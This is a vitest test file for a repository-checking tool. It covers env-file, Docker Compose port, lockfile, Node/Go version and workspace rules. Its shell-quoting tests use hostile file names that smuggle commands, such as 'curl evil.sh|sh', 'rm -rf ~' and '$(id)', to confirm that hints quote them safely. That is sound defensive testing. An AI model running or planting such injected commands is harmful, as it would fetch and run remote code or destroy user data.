/**
 * Behavior on hostile or unusual repositories: shell-safe hints, bounded work
 * on huge inputs, and fewer false positives in monorepos.
 */
import { describe, expect, it } from 'vitest'
import {
  composeEnvFileMissing,
  findEnvPortMismatches,
  findMissingEnvFiles,
  findPortConflicts,
  numericPort,
} from '../../src/doctor/rules/docker.ts'
import {
  findExampleMissing,
  findLocalOnly,
  findUndocumented,
  isTestPath,
  usedOnlyInTests,
} from '../../src/doctor/rules/environment.ts'
import {
  findPackageManagerMismatch,
  lockfileMissing,
  npmrcDisablesLockfile,
  rootLockfiles,
} from '../../src/doctor/rules/package-manager.ts'
import {
  enginesRangeFor,
  findGoVersionConflicts,
  nodeVersionConflict,
  nodeVersionOutOfRange,
  pinScopes,
} from '../../src/doctor/rules/runtime.ts'
import { hasLintScript } from '../../src/doctor/rules/scripts.ts'
import { findTrackedEnvFiles } from '../../src/doctor/rules/security.ts'
import { formatLimitedList, safeText } from '../../src/doctor/rules/shared.ts'
import {
  eslintLegacyConfig,
  findLegacyEslintConfigs,
  findMissingGoSum,
  goSumMissing,
} from '../../src/doctor/rules/tooling.ts'
import { findDuplicateWorkspaceConfig, workspacePatternEmpty } from '../../src/doctor/rules/workspace.ts'
import type { WorkspaceDeclaration } from '../../src/facts/manifests.ts'
import { shellQuote } from '../../src/utils/commands.ts'
import { contextFor, makeProject, timeBudget } from '../helpers.ts'
import {
  envFile,
  environment,
  envVar,
  exact,
  expectWellFormed,
  makeSections,
  nodeRuntime,
  port,
  projectContext,
  runCheck,
  service,
} from './support.ts'

/** Evaluate a single-quoted or bare POSIX shell word the way sh would. */
function unquoteShellWord(word: string): string {
  if (!word.startsWith("'")) return word
  // 'a'\''b' is the quoted string a, an escaped quote, then the quoted string b.
  return word
    .split(`'\\''`)
    .map((part) => part.replace(/^'|'$/g, ''))
    .join("'")
}

describe('shellQuote in hints', () => {
  it('leaves ordinary paths alone', () => {
    for (const path of ['.env', 'apps/web/.env.local', 'config/app@2.env', 'a_b-c+d=e:f,g%h']) {
      expect(shellQuote(path)).toBe(path)
    }
  })

  it('single-quotes paths with shell metacharacters so they stay one literal argument', () => {
    for (const path of [
      '.env;curl evil.sh|sh',
      '$(touch pwned).env',
      '`id`.env',
      'my file.env',
      "it's.env",
      'a&b',
      'x>y',
    ]) {
      const quoted = shellQuote(path)
      expect(quoted.startsWith("'"), path).toBe(true)
      expect(unquoteShellWord(quoted)).toBe(path)
    }
  })

  it('never lets a path start like an option and strips control characters', () => {
    expect(shellQuote('-rf.env')).toBe('./-rf.env')
    expect(shellQuote('.env\u001b[2J')).toBe("'.env[2J'")
  })

  it('never truncates, so a long path still names the same file', () => {
    const long = `apps/${'a'.repeat(300)}/.eslintrc.json`
    expect(shellQuote(long)).toBe(long)
  })
})

describe('safeText', () => {
  it('removes bidi and invisible characters and turns line breaks into spaces', () => {
    expect(safeText('a\u202eb\u200bc\nd')).toBe('abc d')
    expect(safeText('x'.repeat(200), 10)).toBe(`${'x'.repeat(9)}…`)
  })
})

describe('hints quote hostile paths', () => {
  it('TRACKED_ENV_FILE', () => {
    const found = findTrackedEnvFiles(environment([envFile('.env.local;rm -rf ~', 'local', { tracked: true })], []))
    expect(found[0]?.hint).toContain("`git rm --cached '.env.local;rm -rf ~'`")
  })

  it('COMPOSE_ENV_FILE_MISSING', async () => {
    // Needs shell quoting but is a legal file name on every OS ("|" is not allowed on Windows).
    const hostile = '.env;curl -s evil.example;sh'
    const ctx = await projectContext({
      'compose.yaml': `services:\n  app:\n    image: nginx\n    env_file: "${hostile}"\n`,
      [`${hostile}.example`]: 'A=\n',
    })
    const found = await runCheck(composeEnvFileMissing, makeSections(), ctx)
    expect(found).toHaveLength(1)
    expect(found[0]?.hint).toBe(
      `Run \`cp '${hostile}.example' '${hostile}'\` and fill in the values, or mark the entry optional with required: false`,
    )
  })

  it('ESLINT_LEGACY_CONFIG', () => {
    const found = findLegacyEslintConfigs(
      [{ file: 'apps/$(id)/.eslintrc.json', dir: 'apps/$(id)', kind: 'file' }],
      () => 9,
    )
    expect(found[0]?.hint).toContain("`npx @eslint/migrate-config 'apps/$(id)/.eslintrc.json'`")
  })
})

describe('LOCKFILE_MISSING and .npmrc', () => {
  it('recognizes lockfiles turned off for npm and pnpm', () => {
    expect(npmrcDisablesLockfile('package-lock=false\n')).toBe(true)
    expect(npmrcDisablesLockfile('registry=https://r.example\r\n  lockfile = false \r\n')).toBe(true)
    expect(npmrcDisablesLockfile('package-lock=true\n')).toBe(false)
    expect(npmrcDisablesLockfile('# package-lock=false\n')).toBe(false)
    expect(npmrcDisablesLockfile('package-lock=falsey\n')).toBe(false)
  })

  it('stays linear on a huge .npmrc of blank lines (no regex backtracking)', async () => {
    const blank = '\n'.repeat(900_000)
    const started = performance.now()
    expect(npmrcDisablesLockfile(blank)).toBe(false)
    const ctx = await projectContext({
      'package.json': JSON.stringify({ dependencies: { a: '^1.0.0' } }),
      '.npmrc': blank,
    })
    const found = await runCheck(lockfileMissing, makeSections(), ctx)
    expect(found.map((d) => d.code)).toEqual(['LOCKFILE_MISSING'])
    expect(performance.now() - started).toBeLessThan(timeBudget(2000))
  })

  it('is not reported when .npmrc disables the lockfile', async () => {
    const ctx = await projectContext({
      'package.json': JSON.stringify({ dependencies: { a: '^1.0.0' } }),
      '.npmrc': 'lockfile=false\n',
    })
    expect(await runCheck(lockfileMissing, makeSections(), ctx)).toEqual([])
  })
})

describe('PACKAGE_MANAGER_MISMATCH', () => {
  it('only suggests pnpm import for lockfiles pnpm can import', async () => {
    const ctx = await projectContext({ 'bun.lock': '{}', 'package.json': '{}' })
    const found = findPackageManagerMismatch(
      rootLockfiles(ctx.files),
      { id: 'pnpm', field: 'packageManager' },
      () => false,
    )
    expect(found[0]?.hint).toBe(
      'Run `pnpm install` and delete bun.lock, or change "packageManager" if the project uses Bun',
    )
  })
})

describe('Docker rules on huge or odd Compose files', () => {
  it('does not treat port 0 or out-of-range ports as literal host ports', () => {
    expect(numericPort(0)).toBeNull()
    expect(numericPort('0')).toBeNull()
    expect(numericPort('70000')).toBeNull()
    expect(numericPort(65535)).toBe(65535)
    expect(numericPort('123456789012345678901234567890')).toBeNull()
  })

  it('finds clashes between a wildcard binding and specific IPs of other services only', () => {
    const found = findPortConflicts([
      // The same service on two interfaces is not a clash with itself.
      service('a', { ports: [port(80, 80, { hostIp: '127.0.0.1' }), port(80, 80)] }),
      service('b', { ports: [port(80, 80, { hostIp: '127.0.0.2' })] }),
    ])
    expect(found.map((d) => d.message)).toEqual(['Services a and b in docker-compose.yml both publish host port 80'])
    expect(
      findPortConflicts([service('solo', { ports: [port(80, 80, { hostIp: '127.0.0.1' }), port(80, 80)] })]),
    ).toEqual([])
    expect(
      findPortConflicts([
        service('a', { ports: [port(80, 80, { hostIp: '127.0.0.1' })] }),
        service('b', { ports: [port(80, 80, { hostIp: '127.0.0.2' })] }),
        service('c', { ports: [port(80, 80, { hostIp: '127.0.0.2' })] }),
      ]).map((d) => d.message),
    ).toEqual(['Services b and c in docker-compose.yml both publish host port 80'])
  })

  it('handles tens of thousands of services on one port quickly and keeps the message short', () => {
    const services = Array.from({ length: 30_000 }, (_, i) => service(`s${i}`, { ports: [port(80, 80)] }))
    const started = performance.now()
    const found = findPortConflicts(services)
    expect(performance.now() - started).toBeLessThan(timeBudget(1000))
    expect(found).toHaveLength(1)
    expect(found[0]?.message).toMatch(/^Services s0, s1, s10, s100, s1000, s10000, s10001, s10002 and 29992 more in /)
    expect(found[0]?.message.length).toBeLessThan(200)
  })

  it('shortens echoed service names', () => {
    const long = 'x'.repeat(500)
    const found = findPortConflicts([service(long, { ports: [port(80)] }), service('b', { ports: [port(80)] })])
    expect(found[0]?.message.length).toBeLessThan(150)
  })

  it('groups many env_file references without quadratic work and caps the service list', () => {
    const references = Array.from({ length: 30_000 }, (_, i) => ({
      composeFile: 'compose.yaml',
      service: `s${i}`,
      path: '.env',
    }))
    const files = { has: () => false, isIgnored: () => false } as unknown as Parameters<typeof findMissingEnvFiles>[1]
    const started = performance.now()
    const found = findMissingEnvFiles(references, files, 20)
    expect(performance.now() - started).toBeLessThan(timeBudget(1000))
    expect(found).toHaveLength(1)
    expect(found[0]?.message).toContain('and 29992 more in compose.yaml load env_file .env')
  })

  it('lists published ports in numeric order and ignores unknown or prototype-named schemes', () => {
    const redis = { id: 'redis', name: 'Redis' }
    const env = environment(
      [],
      [
        envVar('REDIS_URL', { endpoints: [{ file: '.env', scheme: 'redis', port: 6380, local: true }] }),
        envVar('ODD_URL', { endpoints: [{ file: '.env', scheme: 'constructor', port: 1, local: true }] }),
      ],
    )
    const found = findEnvPortMismatches(env, [
      service('cache', { technology: redis, ports: [port(10000), port(9000)] }),
    ])
    expect(found.map((d) => d.message)).toEqual([
      'REDIS_URL in .env uses port 6380, but the cache service publishes 9000 or 10000',
    ])
  })

  it('computes publishers once per scheme, not per endpoint', () => {
    const pg = { id: 'postgresql', name: 'PostgreSQL' }
    const services = Array.from({ length: 20_000 }, (_, i) =>
      service(`db${i}`, { technology: pg, ports: [port(5432)] }),
    )
    const variables = Array.from({ length: 300 }, (_, i) =>
      envVar(`DB_${i}_URL`, { endpoints: [{ file: '.env', scheme: 'postgres', port: 5432, local: true }] }),
    )
    const started = performance.now()
    expect(findEnvPortMismatches(environment([], variables), services)).toEqual([])
    expect(performance.now() - started).toBeLessThan(timeBudget(1500))
  })
})

describe('formatLimitedList', () => {
  it('names at most the given number of items', () => {
    expect(formatLimitedList(['a', 'b'], 2)).toBe('a and b')
    expect(formatLimitedList(['a', 'b', 'c', 'd'], 2)).toBe('a, b and 2 more')
  })
})

describe('WORKSPACE_DUPLICATE_CONFIG with a settings-only pnpm-workspace.yaml', () => {
  const pnpm = (patterns: string[]): WorkspaceDeclaration => ({
    source: 'pnpm-workspace.yaml',
    file: 'pnpm-workspace.yaml',
    patterns,
  })
  const pkg: WorkspaceDeclaration = { source: 'package.json', file: 'package.json', patterns: ['packages/*'] }

  it('is quiet when another package manager reads package.json', () => {
    expect(findDuplicateWorkspaceConfig([pkg, pnpm([])], 'yarn')).toEqual([])
    expect(findDuplicateWorkspaceConfig([pkg, pnpm([])], 'bun')).toEqual([])
  })

  it('explains that pnpm sees no packages otherwise', () => {
    for (const manager of ['pnpm', undefined]) {
      const found = findDuplicateWorkspaceConfig([pkg, pnpm([])], manager)
      expect(found).toEqual([
        {
          code: 'WORKSPACE_DUPLICATE_CONFIG',
          severity: 'warning',
          category: 'workspace',
          message:
            'package.json declares workspaces, but pnpm-workspace.yaml lists no packages and pnpm only reads pnpm-workspace.yaml',
          hint: 'Move the "workspaces" patterns into a "packages" list in pnpm-workspace.yaml',
          files: ['package.json', 'pnpm-workspace.yaml'],
          subject: 'workspaces',
        },
      ])
    }
  })
})

describe('WORKSPACE_PATTERN_EMPTY below directories RepoLens never walks', () => {
  it('does not report patterns under vendor/ or node_modules/', async () => {
    const ctx = await projectContext({
      'package.json': JSON.stringify({ workspaces: ['packages/*', 'vendor/*', 'tools/*'] }),
      'packages/a/package.json': '{"name":"a"}',
      'vendor/lib/package.json': '{"name":"lib"}',
    })
    const found = await runCheck(workspacePatternEmpty, makeSections(), ctx)
    expect(found.map((d) => d.subject)).toEqual(['tools/*'])
  })
})

describe('GO_SUM_MISSING in a go.work workspace', () => {
  const api = 'module example.com/api\n\ngo 1.25\n\nrequire example.com/shared v0.0.0\n'
  const shared = 'module example.com/shared\n\ngo 1.25\n'

  it('does not require checksums for sibling modules of the workspace', async () => {
    const ctx = await projectContext({
      'go.work': 'go 1.25\n\nuse (\n\t./api\n\t./shared\n)\n',
      'api/go.mod': api,
      'shared/go.mod': shared,
    })
    expect(await runCheck(goSumMissing, makeSections(), ctx)).toEqual([])
  })

  it('still reports a sibling requirement without go.work (Go downloads it)', async () => {
    const ctx = await projectContext({ 'api/go.mod': api, 'shared/go.mod': shared })
    expect((await runCheck(goSumMissing, makeSections(), ctx)).map((d) => d.subject)).toEqual(['api/go.mod'])
  })

  it('keeps reporting external requirements next to workspace ones', () => {
    const found = findMissingGoSum([
      {
        file: 'api/go.mod',
        dir: 'api',
        requires: [
          { path: 'example.com/shared', version: 'v0.0.0', indirect: false },
          { path: 'github.com/google/uuid', version: 'v1.6.0', indirect: false },
        ],
        replaced: new Set(['example.com/shared']),
        sum: 'missing',
      },
    ])
    expect(found[0]?.message).toBe('api/go.mod requires 1 module but there is no go.sum next to it')
  })
})

describe('Node.js pins in monorepos', () => {
  const pin = (file: string, version: string) => ({ file, version, major: Number(version.split('.')[0]) })

  it('gives directories with their own version file their own scope', () => {
    const scopes = pinScopes([
      pin('.github/workflows/ci.yml', '22'),
      pin('.nvmrc', '22'),
      pin('apps/legacy/.nvmrc', '18'),
      pin('apps/legacy/Dockerfile', '18'),
      pin('apps/web/Dockerfile', '20'),
    ])
    expect([...scopes.keys()]).toEqual(['.', 'apps/legacy'])
    expect(scopes.get('.')?.map((p) => p.file)).toEqual(['.github/workflows/ci.yml', '.nvmrc', 'apps/web/Dockerfile'])
    expect(scopes.get('apps/legacy')?.map((p) => p.file)).toEqual(['apps/legacy/.nvmrc', 'apps/legacy/Dockerfile'])
  })

  it('uses the engines.node of the deepest package containing the pin', () => {
    const packages: Parameters<typeof enginesRangeFor>[1] = [
      { dir: '.', file: 'package.json', engines: { node: '>=22' } },
      { dir: 'apps/legacy', file: 'apps/legacy/package.json', engines: { node: '^18' } },
      { dir: 'apps/web', file: 'apps/web/package.json', engines: {} },
    ]
    expect(enginesRangeFor('apps/legacy/.nvmrc', packages)).toEqual({
      range: '^18',
      file: 'apps/legacy/package.json',
    })
    expect(enginesRangeFor('apps/web/Dockerfile', packages)).toEqual({ range: '>=22', file: 'package.json' })
    expect(enginesRangeFor('apps/web/Dockerfile', packages.slice(1))).toBeUndefined()
  })

  it('reports drift from the root pins but not a package that pins its own version', async () => {
    const ctx = await projectContext({
      'package.json': JSON.stringify({ workspaces: ['apps/*'], engines: { node: '>=22' } }),
      'apps/legacy/package.json': JSON.stringify({ name: 'legacy', engines: { node: '^18' } }),
      'apps/web/package.json': JSON.stringify({ name: 'web' }),
    })
    const sections = makeSections({
      runtimes: [
        nodeRuntime([
          exact('.nvmrc', '22'),
          exact('.github/workflows/ci.yml', '22', 'setup-node'),
          exact('apps/legacy/.nvmrc', '18.20.4'),
          exact('apps/legacy/Dockerfile', '18', 'FROM'),
          exact('apps/web/Dockerfile', '20', 'FROM'),
        ]),
      ],
    })
    const conflicts = await runCheck(nodeVersionConflict, sections, ctx)
    expect(conflicts.map((d) => [d.subject, d.message])).toEqual([
      ['node', 'Node.js versions disagree (.github/workflows/ci.yml: 22, .nvmrc: 22, apps/web/Dockerfile: 20)'],
    ])
    const outOfRange = await runCheck(nodeVersionOutOfRange, sections, ctx)
    expect(outOfRange.map((d) => d.message)).toEqual([
      'apps/web/Dockerfile pins Node.js 20, which does not satisfy engines.node ">=22" in package.json',
    ])
    expectWellFormed([...conflicts, ...outOfRange])
  })

  it('reports a conflict inside a package scope with its own subject', async () => {
    const ctx = await projectContext({ 'package.json': JSON.stringify({ workspaces: ['apps/*'] }) })
    const sections = makeSections({
      runtimes: [nodeRuntime([exact('apps/api/.nvmrc', '22'), exact('apps/api/Dockerfile', '20', 'FROM')])],
    })
    const found = await runCheck(nodeVersionConflict, sections, ctx)
    expect(found.map((d) => [d.subject, d.message])).toEqual([
      ['node:apps/api', 'Node.js versions disagree in apps/api (apps/api/.nvmrc: 22, apps/api/Dockerfile: 20)'],
    ])
  })
})

describe('lint script detection', () => {
  it('does not mistake release or lint-staged tooling for a linter run', () => {
    expect(hasLintScript({ release: 'standard-version' })).toBe(false)
    expect(hasLintScript({ precommit: 'lint-staged' })).toBe(false)
    expect(hasLintScript({ check: 'standard' })).toBe(true)
    expect(hasLintScript({ check: 'turbo run lint' })).toBe(true)
    expect(hasLintScript({ ci: 'run-s lint:*' })).toBe(true)
  })
})

describe('tooling rules on partial information', () => {
  it('ignores an eslintConfig field that is not an object', async () => {
    const ctx = await projectContext({
      'package.json': JSON.stringify({ eslintConfig: null, devDependencies: { eslint: '^9.0.0' } }),
    })
    expect(await runCheck(eslintLegacyConfig, makeSections(), ctx)).toEqual([])
  })

  it('does not claim go.sum is missing when the file walk was truncated', async () => {
    const goMod = 'module example.com/app\n\ngo 1.25\n\nrequire github.com/google/uuid v1.6.0\n'
    const dir = await makeProject({ 'go.mod': goMod, 'go.sum': '', 'main.go': 'package main\n' })
    const truncated = await contextFor(dir, { maxFiles: 1 })
    expect(truncated.files.truncated).toBe(true)
    expect(await runCheck(goSumMissing, makeSections(), truncated)).toEqual([])
  })
})

describe('environment variables read only by tests', () => {
  it('recognizes test, fixture, example and test-runner config paths', () => {
    for (const file of [
      'src/app.test.ts',
      'src/__tests__/app.ts',
      'test/setup.ts',
      'packages/api/tests/db.ts',
      'e2e/login.ts',
      'examples/next/app/page.tsx',
      'test/fixtures/app/src/index.ts',
      'internal/db_test.go',
      'tests/test_api.py',
      'playwright.config.ts',
      'apps/web/vitest.config.mts',
    ]) {
      expect(isTestPath(file), file).toBe(true)
    }
    for (const file of ['src/index.ts', 'app/_lib/env.ts', 'scripts/seed.ts', 'vite.config.ts', 'src/testing.ts']) {
      expect(isTestPath(file), file).toBe(false)
    }
  })

  it('decides only when the usage list is complete', () => {
    expect(usedOnlyInTests(envVar('A', { used: true, usedIn: ['test/a.ts'] }))).toBe(true)
    expect(usedOnlyInTests(envVar('A', { used: true, usedIn: ['src/a.ts', 'test/a.ts'] }))).toBe(false)
    const five = ['test/a.ts', 'test/b.ts', 'test/c.ts', 'test/d.ts', 'test/e.ts']
    expect(usedOnlyInTests(envVar('A', { used: true, usedIn: five }))).toBe(false)
    expect(usedOnlyInTests(envVar('A', { used: true, usedIn: [] }))).toBe(false)
  })

  it('does not ask to document test-only variables', () => {
    const example = envFile('.env.example', 'example')
    const env = environment(
      [example],
      [
        envVar('TEST_DB_URL', { used: true, usedIn: ['test/setup.ts'] }),
        envVar('PLAYWRIGHT_BASE_URL', { used: true, usedIn: ['playwright.config.ts'] }),
        envVar('API_KEY', { used: true, usedIn: ['src/api.ts', 'test/api.test.ts'] }),
      ],
    )
    expect(findUndocumented(env).map((d) => d.subject)).toEqual(['API_KEY'])
    const withoutExample = environment([], env.variables)
    expect(findExampleMissing(withoutExample, 'application')[0]?.hint).toBe(
      'Create .env.example with the variable names and empty values: API_KEY=',
    )
    expect(findExampleMissing(environment([], env.variables.slice(0, 2)), 'application')).toEqual([])
  })
})

describe('ENV_LOCAL_ONLY and test-only variables', () => {
  it('still reports a locally set variable that only tests read', () => {
    const env = environment(
      [envFile('.env', 'local'), envFile('.env.example', 'example')],
      [envVar('TEST_DB_URL', { defined: true, definedIn: ['.env'], used: true, usedIn: ['test/setup.ts'] })],
    )
    expect(findUndocumented(env)).toEqual([])
    expect(findLocalOnly(env).map((d) => d.message)).toEqual([
      'TEST_DB_URL is set in .env but missing from .env.example',
    ])
  })
})

describe('GO_VERSION_CONFLICT with toolchains older than Go 1.21', () => {
  it('does not claim GOTOOLCHAIN=local for images that predate it', () => {
    const modules = [{ dir: '.', file: 'go.mod', goVersion: '1.22' }]
    const [old] = findGoVersionConflicts([{ file: 'Dockerfile', version: '1.19', kind: 'docker' }], modules)
    expect(old?.message).toBe(
      'Dockerfile builds with Go 1.19, but go.mod requires go 1.22, which Go versions before 1.21 do not enforce, so the build may fail on newer language features',
    )
    const [ci] = findGoVersionConflicts([{ file: '.github/workflows/ci.yml', version: '1.20', kind: 'ci' }], modules)
    expect(ci?.message).not.toContain('GOTOOLCHAIN')
    const [recent] = findGoVersionConflicts([{ file: 'Dockerfile', version: '1.21', kind: 'docker' }], modules)
    expect(recent?.message).toContain('sets GOTOOLCHAIN=local so the build fails')
  })
})
